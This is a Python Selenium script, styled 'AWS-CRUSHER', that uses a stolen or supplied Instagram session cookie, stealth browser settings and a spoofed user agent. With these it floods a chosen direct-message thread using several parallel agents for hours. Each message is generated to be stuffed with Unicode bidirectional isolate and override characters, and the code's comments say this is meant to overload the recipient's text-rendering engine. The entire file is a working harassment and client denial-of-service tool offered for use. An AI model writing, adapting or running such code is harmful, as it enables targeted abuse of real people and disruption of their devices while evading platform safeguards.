# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (AWS-CRUSHER V22)
# 📅 STATUS: AWS-TARGET-LOCK | 4-AGENT TOTAL | DOCKER-READY

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# --- CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.01, 0.05) # 🔥 HYPER-DRIVE
SESSION_LIMIT = 180       
REST_AFTER_STRIKES = 100   
REST_DURATION = 5          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()
sys.stdout.reconfigure(encoding='utf-8')

def get_aws_crusher_payload():
    """Generates a payload designed to exhaust C++ layout engine recursion."""
    u_id = random.randint(1000, 9999)
    # \u2067 is Right-to-Left Isolate. 
    # \u2068 is First-Strong Isolate.
    # Mixing these forces the 'BiDi' algorithm into O(n^2) complexity.
    glue = "\u2060" 
    iso_mix = ["\u2066", "\u2067", "\u2068", "\u202E", "\u202D"]
    
    header = f"👑 𝕻𝕽𝕬𝖁𝕰𝕰𝕽 𝕻𝕬𝕻𝕬 👑 [AWS_SHUTDOWN_{u_id}]"
    
    body = []
    # 300 lines of recursive directional complexity
    for i in range(300):
        # We create a 'Logic Spiral' for the browser's render tree
        prefix = "".join(random.choices(iso_mix, k=10))
        # Solid blocks combined with isolates force GPU texture-swapping
        body.append(f"{prefix}█▓▒░_𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕿_░▒▓█\u2069\u2069")
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def log_status(agent_id, msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    machine = os.environ.get('MACHINE_ID', '1')
    print(f"[{timestamp}] M-{machine} Agent {agent_id}: {msg}", flush=True)

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        
        # High-End desktop UA to prevent being filtered by AWS-level security
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        temp_dir = os.path.join(tempfile.gettempdir(), f"node_{agent_id}_{int(time.time())}")
        chrome_options.add_argument(f"--user-data-dir={temp_dir}")
        driver = webdriver.Chrome(options=chrome_options)
        
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        driver.custom_temp_path = temp_dir
        return driver

def adaptive_send(driver, text):
    try:
        box = WebDriverWait(driver, 25).until(EC.presence_of_element_located((By.XPATH, "//div[@role='textbox'] | //textarea")))
        driver.execute_script("arguments[0].focus(); document.execCommand('insertText', false, arguments[1]);", box, text)
        time.sleep(0.1)
        box.send_keys(Keys.ENTER)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    global_start = time.time()
    while (time.time() - global_start) < TOTAL_DURATION:
        driver = None
        strike_counter = 0
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            if adaptive_send(driver, "🚀 AWS-CRUSHER MATRIX ONLINE"):
                log_status(agent_id, "✅ Targeting opponent...")

            while (time.time() - global_start) < TOTAL_DURATION:
                payload = get_aws_crusher_payload()
                if adaptive_send(driver, payload):
                    strike_counter += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    
                    if strike_counter % REST_AFTER_STRIKES == 0:
                        log_status(agent_id, f"✅ 100 Sent. Resting.")
                        time.sleep(REST_DURATION)
                    else:
                        log_status(agent_id, f"Delivered (Total: {GLOBAL_SENT})")
                        
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            if driver: driver.quit()
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
